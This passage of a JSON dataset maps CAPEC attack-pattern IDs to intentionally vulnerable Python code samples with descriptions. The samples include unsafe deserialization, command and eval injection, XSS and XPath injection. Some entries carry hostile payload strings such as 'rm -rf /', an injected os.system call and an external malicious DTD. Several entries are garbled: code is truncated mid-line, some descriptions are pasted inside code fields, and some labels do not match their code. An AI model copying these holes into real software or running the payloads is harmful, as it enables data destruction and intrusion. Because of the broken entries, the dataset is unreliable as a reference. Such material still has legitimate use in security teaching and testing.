        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport yaml\n\ndef process_config(file_path):\n    if file_path.endswith('.xml'):\n        tree = ET.parse(file_path)\n        root = tree.getroot()\n        params = {}\n        for elem in root.findall('.//param'):\n            params[elem.get('name')] = elem.get('value')\n            # Recursively expand all entity references\n            for child in elem.iter():\n                if child.text:\n                    _ = child.text\n    elif file_path.endswith('.yaml'):\n        with open(file_path, 'r') as f:\n            # Unsafe YAML loading without resource limits\n            config = yaml.load(f, Loader=yaml.Loader)\n            return process_nested_config(config)\n\ndef process_nested_config(config, depth=0):\n    result = {}\n    for key, value in config.items():\n        if isinstance(value, dict):\n            result[key] = process_nested_config(value, depth + 1)\n        else:\n            result[key] = value\n    return result",
        "description": "This code demonstrates a vulnerable configuration parser that processes XML and YAML files without proper resource limits or input validation. It recursively processes nested configurations and entity references without restrictions, making it susceptible to entity expansion attacks and resource exhaustion through deeply nested structures. The code also uses unsafe YAML loading which can lead to arbitrary code execution."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\n\ndef process_xml_data(xml_string):\n    try:\n        tree = ET.fromstring(xml_string)\n        process_element(tree)\n    except Exception as e:\n        print(f\"Error: {e",
        "description": "\"This code demonstrates vulnerable XML parsing by not validating input XML against a schema, allowing unrestricted entity expansion, and implementing unbounded recursion. It's susceptible to XML entity expansion attacks and can lead to denial of service through excessive resource consumption.\""
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport pickle\n\ndef process_xml_data(xml_data):\n    try:\n        # Unsafe XML parsing without validation or size limits\n        tree = ET.fromstring(xml_data)\n        process_element(tree)\n\ndef process_element(element, depth=0):\n    # Recursive processing without depth limit\n    data = {}\n    for child in element:\n        # Collect all data in memory without size checks\n        data[child.tag] = child.text\n        process_element(child, depth + 1)\n    \n    # Unsafe deserialization of data\n    if 'payload' in data:\n        pickled_data = data['payload'].encode('utf-8')\n        unpickled = pickle.loads(pickled_data)\n        return unpickled\n\n# Usage\nxml_input = input('Enter XML data: ')\nresult = process_xml_data(xml_input)",
        "description": "This code demonstrates multiple vulnerabilities: it processes XML without schema validation, performs unchecked recursive processing of XML elements, deserializes data unsafely using pickle, and doesn't limit memory allocation during processing. An attacker could supply malicious XML with deep nesting or large payloads to cause resource exhaustion, or include serialized malicious code for execution."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.user_privileges = {}\n        self.resource_status = {}\n\n    def set_user_privilege(self, user_id, level):\n        self.user_privileges[user_id] = level\n\n    def access_resource(self, user_id, resource_id):\n        if user_id not in self.user_privileges:\n            self.user_privileges[user_id] = 'guest'\n            \n        try:\n            # Race condition: Status check and access aren't atomic\n            resource_status = self.check_resource_status(resource_id)\n            if resource_status == 'processing':\n                return self.get_resource_data(resource_id)\n            \n            # Missing proper privilege validation\n            if self.user_privileges[user_id]:\n                return self.get_resource_data(resource_id)\n        except Exception:\n            # Privilege check bypass on error\n            return self.get_resource_data(resource_id)\n            \n    def get_resource_data(self, resource_id):\n        return f'Data for resource {resource_id}'\n        \n    def check_resource_status(self, resource_id):\n        return 'processing'",
        "description": "This vulnerable code demonstrates improper privilege management and insufficient privilege handling. The code fails to properly validate user privileges before accessing resources, contains a race condition between status checking and resource access, and bypasses security checks on error conditions. It also lacks proper isolation between different privilege levels and incorrectly assumes default privileges when none are specified."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\ndef run_maintenance_task():\n    # Elevate to root privileges\n    os.setuid(0)\n\n    # Run external command from user input without dropping privileges\n    command = input('Enter maintenance command: ')\n    os.system(command)\n\n    # Keep running with elevated privileges\n    while True:\n        task = input('Enter next task: ')\n        os.system(task)\n\nif __name__ == '__main__':\n    run_maintenance_task()",
        "description": "This code elevates privileges to root, executes commands from user input with those elevated privileges, and fails to drop privileges after the operation. It allows arbitrary command execution with root privileges, making it vulnerable to privilege escalation and command injection attacks."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "\"\"\"\nimport threading\nimport socket\n\nclass UnsafeDataStore:\n    static_data = {",
        "description": "\"This code demonstrates multiple vulnerabilities including unsafe static data access in a multi-threaded context, lack of proper thread synchronization, and vulnerability to capture-replay attacks in network authentication. The static_data dictionary is shared across threads without proper synchronization, and the authentication mechanism lacks replay protection or proper access controls.\""
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import socket\nimport signal\n\ndef unsafe_signal_handler(signum, frame):\n    global sensitive_data\n    # Unsafe signal handler with non-reentrant operations\n    with open('credentials.txt', 'r') as f:\n        sensitive_data = f.read()\n\ndef authenticate_user(client_socket):\n    # Vulnerable authentication mechanism susceptible to replay attacks\n    auth_token = client_socket.recv(1024)\n    # No timestamp or nonce check\n    if auth_token in stored_tokens:\n        return True\n    return False\n\ndef handle_client(client_socket):\n    if authenticate_user(client_socket):\n        # IOCTL-like functionality without proper access control\n        command = client_socket.recv(1024)\n        try:\n            exec(command)  # Dangerous execution without proper validation\n        except Exception:\n            pass  # Unchecked error condition\n\nsignal.signal(signal.SIGUSR1, unsafe_signal_handler)\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client, addr = server_socket.accept()\n    handle_client(client)",
        "description": "This vulnerable code demonstrates multiple security issues: authentication bypass through capture-replay attacks (no nonce/timestamp validation), unsafe signal handler with non-reentrant operations, insufficient access control for command execution, and unchecked error conditions. The code accepts authentication tokens without proper validation, uses an unsafe signal handler that performs file I/O, and executes commands without proper access control or error handling."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "\"\"\"\nimport ctypes\nimport os\n\nclass UnsafeSandbox:\n    def __init__(self):\n        self._libc = ctypes.CDLL('libc.so.6')\n        self._restricted = False\n    \n    def run_untrusted_code(self, code_str):\n        try:\n            if not self._restricted:\n                # Unsafe: Allows direct access to system libraries\n                exec(f'''\nimport ctypes\nlibc = ctypes.CDLL('libc.so.6')\n{code_str",
        "description": "\"This code demonstrates an unsafe sandbox implementation that allows untrusted code to escape isolation by accessing system libraries directly through ctypes. It exposes sensitive system functionality and detailed error information, violating sandbox boundaries and enabling privilege escalation. The code fails to properly restrict access to native system calls and leaks implementation details through error messages.\""
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "\"\"\"\ndef handle_url_request(url, user):\n    # Poor isolation of constants and incorrect path handling\n    ADMIN_PATH = '/admin'\n    USER_PATH = '/user'\n    \n    # Authorization check before proper URL parsing/canonicalization\n    if user.role == 'admin' and ADMIN_PATH in url:\n        is_authorized = True\n    else:\n        is_authorized = False\n\n    # Incorrect control flow and insufficient path protection\n    parsed_url = url.replace('../', '').replace('//', '/')\n    \n    if is_authorized:\n        if parsed_url.startswith(ADMIN_PATH):\n            return serve_admin_content(parsed_url)\n        elif parsed_url.startswith(USER_PATH):\n            return serve_user_content(parsed_url)\n    else:\n        if '\\\\admin' in url or '%2fadmin' in url.lower():\n            return serve_admin_content(url)\n        return 'Access Denied'\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates multiple security issues including authorization checks before proper URL parsing, insufficient path traversal protection, improper constant isolation, and incorrect control flow implementation. The code performs authorization checks on raw URLs before proper canonicalization, allowing potential bypass using encoded paths. It also has insufficient protection against alternate paths and inconsistent authorization logic.\"",
        "description": "\"This vulnerable code demonstrates multiple security issues including authorization checks before proper URL parsing, insufficient path traversal protection, improper constant isolation, and incorrect control flow implementation. The code performs authorization checks on raw URLs before proper canonicalization, allowing potential bypass using encoded paths. It also has insufficient protection against alternate paths and inconsistent authorization logic.\""
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "class OnlineStore:\n    def __init__(self):\n        self._items = {'product1': 100, 'product2': 200}\n        self._discount = 0\n\n    def apply_discount(self, discount_code):\n        # Client-side validation only\n        if self.client_validate_discount(discount_code):\n            self._discount = 50\n\n    def client_validate_discount(self, code):\n        # Validation logic exposed to client\n        return code == 'SAVE50'\n\n    def calculate_price(self, item, quantity):\n        # Price calculation done client-side\n        if item in self._items:\n            base_price = self._items[item] * quantity\n            return base_price - self._discount\n        return 0\n\n# Usage\nstore = OnlineStore()\nstore.apply_discount('SAVE50')\nprice = store.calculate_price('product1', 2)",
        "description": "This vulnerable code demonstrates client-side security enforcement by implementing price calculations and discount validations on the client side. The authentication and validation logic is exposed and can be easily bypassed by modifying the client code. Critical business logic like price calculations and discount validations should be performed server-side to prevent manipulation."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "def process_file(user_input):\n    filename = user_input.strip()\n    command = f'cat {filename} > /tmp/output'\n    import os\n    os.system(command)\n\ndef main():\n    user_path = input('Enter file path: ')\n    process_file(user_path)",
        "description": "This code demonstrates resource injection vulnerability by directly using unsanitized user input as a file path and command parameter. An attacker could provide malicious input containing shell metacharacters or path traversal sequences to execute arbitrary commands or access unauthorized files."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import httplib # Deprecated module\n\ndef authenticate_user(username, password):\n    # Using deprecated httplib module\n    conn = httplib.HTTPConnection('example.com')\n    \n    # Vulnerable authentication using old method\n    query = \"SELECT * FROM users WHERE username='%s' AND password='%s'\" % (username, password)\n    \n    # Using obsolete string formatting\n    conn.request('GET', '/auth?q=' + query)\n    \n    # No proper initialization of connection or error handling\n    response = conn.getresponse()\n    return response.status == 200\n\n# Dynamic class loading without verification\ndef load_plugin(plugin_name):\n    module = __import__(plugin_name)\n    return module.Plugin()",
        "description": "This code demonstrates multiple vulnerabilities including use of deprecated modules (httplib), SQL injection through string formatting, improper authentication mechanisms, and unsafe dynamic class loading. It uses obsolete functions and methods that may have security implications, while lacking proper initialization and security controls."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "def process_user_data(user_input):\n    # Directly evaluating user input as Python code\n    result = eval(user_input)\n    \n    # Execute user-provided command without validation\n    import os\n    os.system(f'echo {user_input}')\n    \n    # Dynamic SQL query construction\n    import sqlite3\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    cursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n    \n    # Dynamic code generation from user input\n    dynamic_function = f'''\ndef dynamic_func():\n    {user_input}\n'''\n    exec(dynamic_function)",
        "description": "This code demonstrates multiple injection vulnerabilities by directly using unvalidated user input in code execution contexts (eval), command execution (os.system), SQL queries, and dynamic code generation (exec). It fails to sanitize special characters or validate input, allowing arbitrary code execution and command injection attacks."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "\"\"\"\ndef display_user_profile(request):\n    user_input = request.GET.get('user_content', '')\n    # Vulnerable - directly inserting user input into HTML attributes\n    html = f'''\n        <div class='profile'>\n            <img src='{user_input",
        "description": "\"This code demonstrates a vulnerable implementation of user input handling in HTML attributes. It takes user input from a GET parameter and directly inserts it into multiple HTML attributes including src, style, onmouseover, and href without any sanitization. This allows attackers to inject malicious JavaScript code through these attributes, potentially executing arbitrary scripts in victims' browsers.\""
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\ndef create_profile_page(request):\n    user_website = request.args.get('website', '')\n    profile_template = '''\n    <html>\n        <body>\n            <h1>User Profile</h1>\n            <p>Visit my website: <a href=\"{{ website }}\">My Site</a></p>\n        </body>\n    </html>\n    '''\n    return render_template_string(profile_template, website=user_website)",
        "description": "This vulnerable code accepts a user-provided website URL and directly embeds it into an HTML anchor tag without proper sanitization. An attacker could inject a malicious URI using javascript: or data: schemes (e.g., 'javascript:alert(document.cookie)' or 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==') that would execute when clicked. The code fails to validate or encode URI schemes and doesn't properly neutralize dangerous attributes, making it susceptible to XSS attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "\"\"\"from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef vulnerable_page():\n    user_input = request.args.get('comment', '')\n    \n    # Flawed validation attempt that can be bypassed with doubled characters\n    def basic_filter(input_str):\n        if '<script>' in input_str.lower():\n            return 'Potentially malicious content blocked'\n        return input_str\n    \n    # Vulnerable template rendering with inadequate filtering\n    template = '''\n    <html>\n        <body>\n            <h1>Comments</h1>\n            <div>%s</div>\n        </body>\n    </html>\n    ''' % basic_filter(user_input)\n    \n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)\"\"\",\n    \n    \"description\": \"This code demonstrates a vulnerable web application that attempts to filter XSS attacks but fails to account for doubled character attacks. The filtering function only checks for exact '<script>' matches, allowing bypass through techniques like '<<script>' or encoded variants. The use of render_template_string with unescaped user input creates a XSS vulnerability. An attacker can exploit this by sending malicious input with doubled characters that bypasses the basic filter.\"",
        "description": "\"This code demonstrates a vulnerable web application that attempts to filter XSS attacks but fails to account for doubled character attacks. The filtering function only checks for exact '<script>' matches, allowing bypass through techniques like '<<script>' or encoded variants. The use of render_template_string with unescaped user input creates a XSS vulnerability. An attacker can exploit this by sending malicious input with doubled characters that bypasses the basic filter.\""
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\ndef filter_xss(input_str):\n    # Incomplete denylist - only blocks basic script tags\n    blacklist = ['<script>', '</script>']\n    for item in blacklist:\n        input_str = input_str.replace(item, '')\n    return input_str\n\napp = Flask(__name__)\n\n@app.route('/render', methods=['GET'])\ndef render_page():\n    user_input = request.args.get('content', '')\n    # Incomplete filtering allows alternate XSS syntax\n    filtered_input = filter_xss(user_input)\n    \n    # Vulnerable template with unescaped user input\n    template = '''<html>\n        <head>\n            <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n        </head>\n        <body>\n            <img src=\"%s\" />\n            <div>%s</div>\n        </body>\n    </html>''' % (filtered_input, filtered_input)\n    \n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code demonstrates multiple XSS vulnerabilities including incomplete denylist filtering, lack of proper escaping for IMG tag attributes, and insufficient protection against alternate XSS syntax. The application accepts user input and attempts to filter it using a basic denylist, but fails to account for variations like doubled characters or alternate script syntax. The input is then unsafely embedded into an HTML template, including within an IMG tag's src attribute, making it susceptible to XSS attacks."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "def process_user_input(user_input):\n    # Basic filter that only checks for '<script>' but doesn't handle invalid characters\n    if '<script>' in user_input.lower():\n        return 'Invalid input'\n    \n    # Vulnerable processing of user input in error messages\n    try:\n        # Process the input, potentially containing null bytes or encoded characters\n        processed_input = user_input.replace('\\x00', '')\n        \n        # Create error message HTML without proper encoding\n        error_template = f\"<div class='error'>Error processing: {processed_input}</div>\"\n        \n        # Save to database or display - vulnerable to XSS\n        return error_template\n    except Exception as e:\n        return f\"<div class='error'>Processing error: {user_input}</div>\"\n\n# Example usage\nmalicious_input = '<scr\\x00ipt>alert(1)</script>'",
        "description": "This code demonstrates multiple vulnerabilities related to improper handling of invalid characters in web identifiers and inadequate XSS protection. The filter can be bypassed using null bytes or other invalid characters, and the error handling exposes unencoded user input. It fails to properly sanitize input containing script tags, especially when they include special characters or doubled characters, and doesn't properly encode output for the HTML context."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "\"\"\"\ndef process_user_request(request_data):\n    command = 'ls ' + request_data['directory']\n    result = os.system(command)\n    return f'Command executed with status: {result",
        "description": "\"The code demonstrates command injection vulnerabilities by directly incorporating user-supplied input into shell commands without proper sanitization. The functions process_user_request, backup_files, and execute_custom_script all concatenate user input into command strings that are executed by the system shell, allowing attackers to inject malicious commands through specially crafted input values.\""
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "\"\"\"\nimport os\n\ndef process_user_command(user_input):\n    # Vulnerable command execution without input sanitization\n    command = f'ls {user_input",
        "description": "\"This vulnerable code demonstrates command injection through writeable terminal devices by directly passing unsanitized user input to system commands. The code allows an attacker to inject malicious commands through the terminal input, which are then executed with the same privileges as the running process. An attacker could input something like '.; rm -rf /' to execute unauthorized commands.\""
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_user_data(username):\n    # Load XML database\n    tree = ET.parse('users.xml')\n    root = tree.getroot()\n    \n    # Vulnerable XPath query construction\n    xpath_query = \"//user[username='\" + username + \"']\"\n    \n    # Find user data using raw XPath query\n    user = root.find(xpath_query)\n    \n    if user is not None:\n        return {\n            'username': user.find('username').text,\n            'password': user.find('password').text,\n            'role': user.find('role').text\n        }\n    return None\n\n# Example usage\nuser_input = \"' or '1'='1'\"\nresult = get_user_data(user_input)",
        "description": "This code demonstrates a vulnerable XML query implementation that allows for XML injection attacks. The function takes a username parameter and constructs an XPath query without proper input sanitization. An attacker can inject malicious XML queries to bypass authentication or extract unauthorized data. The vulnerability exists because the code directly concatenates user input into the XPath query string without any validation or sanitization, allowing for manipulation of the query structure."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "\"\"\"\nimport importlib.util\nimport os\n\n# Global variable for library paths\nLIBRARY_PATHS = ['/usr/lib', '/lib', './local_libs', './custom_libs']\n\ndef load_dynamic_library(lib_name):\n    # Search through multiple paths for the library\n    for path in LIBRARY_PATHS:\n        lib_path = os.path.join(path, f'{lib_name",
        "description": "\"This vulnerable code demonstrates dynamic library loading without proper validation. It searches for libraries in multiple paths including user-controllable directories, allows loading of potentially malicious code, uses global variables for path configuration, and executes arbitrary functions from loaded modules. The code lacks verification of library authenticity and relies on machine-dependent file paths.\""
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "\"\"\"\nimport os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/load_php', methods=['POST'])\ndef load_php_file():\n    php_file = request.args.get('file')\n    \n    # Vulnerable file inclusion - no validation of file path or extension\n    file_path = f'/var/www/php_files/{php_file",
        "description": "\"This vulnerable code allows arbitrary PHP file inclusion and execution through two endpoints. The /load_php endpoint accepts a file parameter without proper validation, allowing path traversal and execution of any PHP file on the system. The /upload endpoint allows uploading of PHP files based solely on file extension, enabling attackers to upload malicious PHP code. Neither endpoint implements proper security controls for file handling or execution.\""
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import urllib.request\nimport importlib.util\n\ndef load_remote_library(url):\n    try:\n        # Download code from remote URL\n        response = urllib.request.urlopen(url)\n        code = response.read()\n        \n        # Save to temporary file\n        with open('temp_lib.py', 'wb') as f:\n            f.write(code)\n        \n        # Load and execute the code\n        spec = importlib.util.spec_from_file_location('remote_lib', 'temp_lib.py')\n        module = importlib.util.module_from_spec(spec)\n        spec.loader.exec_module(module)\n        return module\n    except Exception as e:\n        print(f'Failed to load library: {e}')\n\n# Usage example\nremote_lib = load_remote_library('http://untrusted-server.com/library.py')\nremote_lib.execute_function()",
        "description": "This vulnerable code demonstrates loading and executing Python code from a remote URL without any integrity checks or verification of the source. It downloads arbitrary code and executes it directly, which could allow an attacker to inject malicious code or load vulnerable library versions."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml_from_user(xml_input):\n    # Unsafe XML parsing with external DTD allowed\n    parser = ET.XMLParser()\n    try:\n        tree = ET.fromstring(xml_input, parser=parser)\n        \n        # Process and store entity expansions without limit\n        for elem in tree.iter():\n            process_element(elem)\n            \n        return tree\n    except ET.ParseError as e:\n        print(f'Debug log: Failed to parse XML - {e}')\n        return None\n\ndef process_element(elem):\n    # Recursive processing without entity expansion limits\n    for child in elem:\n        process_element(child)\n\n# Example usage\nxml_with_dtd = '''<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://malicious.example.com/evil.dtd\">\n  %remote;\n]>\n<root>content</root>'''\n\nresult = parse_xml_from_user(xml_with_dtd)",
        "description": "Vulnerable XML parsing code that allows unrestricted DTD processing and recursive entity expansion. The code accepts external DTD references without validation, doesn't limit entity expansions, and exposes processing details through debug logging. This implementation is susceptible to XXE attacks, billion laughs attacks, and information disclosure through debug logs."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "def process_soap_array(soap_request):\n    claimed_size = soap_request.get('array_size', 0)\n    array_data = soap_request.get('array_data', [])\n    \n    # Allocate buffer based on claimed size, not actual size\n    buffer = bytearray(claimed_size)\n    \n    # Vulnerable: copies data without checking actual length\n    for i in range(len(array_data)):\n        buffer[i] = array_data[i]  # Potential buffer overflow\n    \n    return buffer",
        "description": "This code demonstrates a vulnerable SOAP array processing function that trusts the claimed array size in the request without validating it against the actual data length. It allocates a buffer based on the claimed size and attempts to copy the entire array data, potentially causing a buffer overflow if the actual data length exceeds the claimed size."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "class UserData:\n    def __init__(self):\n        self.sensitive_data = {}\n        self.debug_log = open('debug.log', 'a')\n        self.server_log = open('server.log', 'a')\n    \n    def store_user_credentials(self, username, password):\n        self.sensitive_data[username] = password\n        self.debug_log.write(f'Stored credentials for {username}:{password}\\n')\n    \n    def authenticate(self, username, password):\n        # Vulnerable bypass\n        if 'admin' in username.lower():\n            return True\n        return self.sensitive_data.get(username) == password\n    \n    def log_access(self, user, data):\n        self.server_log.write(f'Access: {user} retrieved data: {data}\\n')",
        "description": "The code demonstrates multiple deprecated security anti-patterns including: unprotected storage of sensitive data, information exposure through debug and server logs, and a weak authentication mechanism that can be easily bypassed. The code writes sensitive information to log files and implements a flawed authentication check that allows unauthorized access."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "class AuthClient:\n    def __init__(self):\n        self.token = None\n\n    def authenticate(self, username, password):\n        # Client-side authentication only\n        if username == 'admin' and password == 'password':\n            self.token = 'authenticated'\n            return True\n        return False\n\n    def make_request(self, data):\n        # No server-side verification of authentication\n        import socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('api.example.com', 80))\n        # Send data without proper authentication check\n        sock.send(data.encode())\n        response = sock.recv(1024)\n        sock.close()\n        return response",
        "description": "This code demonstrates vulnerable client-side authentication where authentication logic is implemented only on the client side, making it susceptible to bypass. The code also includes network communication that could be captured and replayed by an attacker. The authentication token is not properly verified on subsequent requests, allowing for authentication bypass through capture-replay attacks."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\nimport logging\n\ndef authenticate_user(username, password):\n    # Client-side only authentication\n    if username == 'admin' and password == 'password123':\n        return True\n    return False\n\ndef handle_connection(client_socket):\n    # Set up debug logging that may expose sensitive information\n    logging.basicConfig(filename='debug.log', level=logging.DEBUG)\n    \n    data = client_socket.recv(1024)\n    # No server-side validation of authentication\n    auth_token = data.decode()\n    \n    # Store received auth tokens without validation\n    with open('auth_tokens.txt', 'a') as f:\n        f.write(auth_token + '\\n')\n    \n    logging.debug(f'Received auth token: {auth_token}')\n    client_socket.send(b'Authentication successful')\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('localhost', 8888))\n    server.listen(5)\n    \n    while True:\n        client_socket, addr = server.accept()\n        handle_connection(client_socket)",
        "description": "This vulnerable code demonstrates multiple authentication bypass issues including client-side only authentication, capture-replay vulnerability, and sensitive information exposure through debug logging. The server accepts and stores authentication tokens without validation, making it susceptible to replay attacks. Additionally, debug logging exposes sensitive authentication information."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "\"\"\"\nimport socket\nimport base64\n\nclass AuthenticatedClient:\n    def __init__(self):\n        self.username = 'admin'\n        self.password = 'secret'\n        self.auth_token = None\n    \n    def authenticate(self):\n        # Client-side only authentication\n        credentials = f'{self.username",
        "description": "\"This code demonstrates multiple vulnerabilities including client-side only authentication (CWE-603), susceptibility to capture-replay attacks (CWE-294), and authentication bypass issues. The authentication is performed only on the client side without server validation, and the authentication token is transmitted in plaintext, making it easy to capture and replay. The socket communication is unencrypted, allowing network sniffing.\""
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "\"\"\"\ndef get_user_info(user_input):\n    try:\n        db_connection = mysql.connector.connect(\n            host='localhost',\n            user='admin',\n            password='password123',\n            database='users'\n        )\n        cursor = db_connection.cursor()\n        \n        # Vulnerable query construction without input validation\n        query = f\"SELECT * FROM users WHERE username = '{user_input",
        "description": "\"This code contains multiple vulnerabilities including SQL injection through unvalidated user input, exposure of sensitive information in error messages, and improper query construction. The error handler reveals detailed system information and query details that could be exploited by an attacker to gather information about the database structure and system configuration.\""
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\ndef process_uploaded_file(file_path):\n    # Blindly trusting file extension for processing\n    _, ext = os.path.splitext(file_path)\n    \n    if ext.lower() == '.txt':\n        # Create temporary file without proper security checks\n        temp_file = '/tmp/processed_' + os.path.basename(file_path)\n        \n        # Unsafe copy operation of untrusted file\n        shutil.copy2(file_path, temp_file)\n        \n        try:\n            with open(temp_file, 'r') as f:\n                content = f.read()\n                # Process content without validation\n                exec(content)  # Extremely dangerous!\n                \n        except Exception as e:\n            # Unsafe error handling that might expose system info\n            print(f\"Error processing file: {str(e)",
        "description": "\"This vulnerable code accepts a file path and processes it based solely on its extension. It creates an insecure temporary file, fails to validate the file content, executes content blindly, and has improper error handling. It's vulnerable to malicious file uploads, unsafe file operations, and arbitrary code execution through corrupted files.\""
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "# Global variables with overly wide scope\nUSER_INPUT = ''\nCOMMAND_PREFIX = 'echo '\n\ndef process_input():\n    global USER_INPUT\n    USER_INPUT = input('Enter command: ')\n    \ndef execute_command():\n    global USER_INPUT\n    # Vulnerable eval usage with global variables\n    command = COMMAND_PREFIX + USER_INPUT\n    eval(command)\n\ndef main():\n    process_input()\n    execute_command()\n\nif __name__ == '__main__':\n    main()",
        "description": "This code demonstrates multiple vulnerabilities including eval injection through unvalidated user input, excessive use of global variables with unnecessarily wide scope, and hardcoded string literals instead of symbolic constants. The code allows arbitrary command execution through eval() using global variables, making it susceptible to injection attacks."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "# Global variables accessible throughout the application\nglobal_user_data = {}\nglobal_config = {}\n\ndef process_user_input(user_input):\n    # Dynamically evaluate variable names from user input\n    var_name = user_input.get('variable_name')\n    var_value = user_input.get('value')\n    \n    # Unsafe dynamic variable assignment using exec\n    exec(f'global_user_data[\"{var_name}\"] = \"{var_value}\"')\n\ndef display_user_data():\n    # Function that reads from global variables\n    for var_name in global_user_data:\n        # Unsafe dynamic variable access\n        exec(f'print(global_user_data[\"{var_name}\"])')\n\n# Example usage\nmalicious_input = {\n    'variable_name': 'admin_password\"]; import os; os.system(\"echo hacked\"); #',\n    'value': 'test'\n}\nprocess_user_input(malicious_input)",
        "description": "This vulnerable code demonstrates excessive reliance on global variables and unsafe dynamic variable evaluation. It allows user input to influence variable names at runtime without proper validation, enabling potential code injection through exec(). The code uses overly broad variable scope and lacks proper controls for dynamically-managed resources, making it susceptible to manipulation of user-controlled variables."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "class UserProfile:\n    def __init__(self):\n        self.attributes = {}\n\n    def update_attributes(self, input_data):\n        # Validate input before canonicalization (CWE-180)\n        self._validate_input(input_data)\n        \n        # Dynamic evaluation of input without proper sanitization (CWE-95)\n        for key, value in input_data.items():\n            # Dangerous: allows modification of any attribute through eval\n            exec(f'self.attributes[\"{key}\"] = {value}')\n\n    def _validate_input(self, input_data):\n        # Basic validation that happens before canonicalization\n        for key in input_data:\n            if len(str(key)) > 50:\n                return False\n        return True\n\n# Usage\nprofile = UserProfile()\nmalicious_input = {'__dict__': '{\"malicious\": \"data\"}', 'system': 'os.system(\"rm -rf /\")'}\nprofile.update_attributes(malicious_input)",
        "description": "This code is vulnerable because it performs validation before canonicalization, allows unrestricted modification of object attributes, and uses dangerous eval-like functionality (exec) to process user input. The code demonstrates CWE-180 (validation before canonicalization), CWE-915 (uncontrolled modification of object attributes), and CWE-95 (eval injection). The validation check is insufficient and can be bypassed, allowing an attacker to inject malicious code that will be executed through the exec function."
    },
    {
        "capec_id": "267",
